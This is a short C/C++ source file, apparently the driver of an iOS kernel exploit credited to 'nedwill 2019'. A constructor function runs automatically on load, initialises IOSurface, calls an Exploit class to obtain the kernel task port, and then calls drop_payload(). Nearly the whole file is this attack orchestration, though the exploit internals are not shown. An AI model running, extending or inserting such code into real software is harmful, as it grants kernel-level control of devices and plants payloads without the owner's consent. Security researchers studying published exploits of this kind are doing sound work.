// <3 nedwill 2019

extern "C" {
#include <stdio.h>
#include "iosurface.h"
#include "parameters.h"
#include "kernel_memory.h"
#include "drop_payload.h"
}

#include "exploit.h"

/*
1. Cleanup header imports, delete unused files/functions
2. Check file headers
3. Release...
*/

__attribute__((constructor))
void load() {
  IOSurface_init();

  if (!parameters_init()) {
    printf("failed to initialized parameters\n");
    return;
  }

  Exploit exploit;
  if (!exploit.GetKernelTaskPort()) {
    printf("Exploit failed\n");
  } else {
    printf("Exploit succeeded\n");
  }

  IOSurface_deinit();

  drop_payload();
}
